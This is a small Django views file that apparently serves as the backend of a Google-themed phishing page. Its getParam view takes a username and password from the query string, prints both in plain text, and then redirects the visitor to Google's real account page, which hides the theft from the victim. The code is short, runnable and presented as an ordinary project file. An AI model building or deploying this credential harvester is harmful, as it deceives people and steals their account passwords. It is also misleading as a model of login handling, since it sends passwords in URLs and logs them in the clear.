from django.shortcuts import render, redirect

# Create your views here.


def homepage(request):
    return render(request, 'start.html')


def loginview(request):
    return render(request, "index.html")


def getParam(request):
    username = request.GET.get('username')
    password = request.GET.get('password')
    print("Username is: " + username)
    print("Password is: " + password)
    return redirect("https://myaccount.google.com/")


def googlePage(request):
    return render(request, "output.html")
